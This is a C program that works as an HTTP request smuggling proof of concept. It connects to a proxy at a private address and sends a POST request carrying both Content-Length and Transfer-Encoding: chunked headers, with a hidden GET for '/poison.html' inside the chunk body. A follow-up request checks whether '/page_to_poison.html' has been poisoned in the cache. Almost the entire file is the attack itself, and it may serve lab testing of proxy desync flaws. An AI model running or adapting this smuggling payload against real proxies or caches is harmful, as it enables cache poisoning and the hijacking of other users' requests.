#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// Define the target server details (Proxy Server)
#define SERVER_IP "192.168.1.202"  // Proxy server IP
#define SERVER_PORT 8080           // Proxy server port

// Define a constant for the Host Header
const char *PROXY_HOST = "192.168.1.202:8080";



int main() {
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(1);
    }

    // Configure server address
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    // Convert IP address to binary form
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        exit(1);
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        exit(1);
    }

    // First request (smuggling the GET request)
    char smuggling_request[512];
    snprintf(smuggling_request, sizeof(smuggling_request),
        "POST /doomle.html HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: 0\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "4F\r\n"  // chunk size in hex
        "GET /poison.html HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n\r\n",
        PROXY_HOST, PROXY_HOST  // Using the defined constant
    );

    // Send the Smuggling Request
    if (send(sockfd, smuggling_request, strlen(smuggling_request), 0) < 0) {
        perror("Error sending request");
        exit(1);
    }

    // Second request (validation)
    char validation_request[256];
    snprintf(validation_request, sizeof(validation_request),
        "GET /page_to_poison.html HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        PROXY_HOST  // Using the defined constant
    );

    // Send the Validation Request
    if (send(sockfd, validation_request, strlen(validation_request), 0) < 0) {
        perror("Error sending request");
        exit(1);
    }

    // Close the socket
    close(sockfd);

    return 0;
}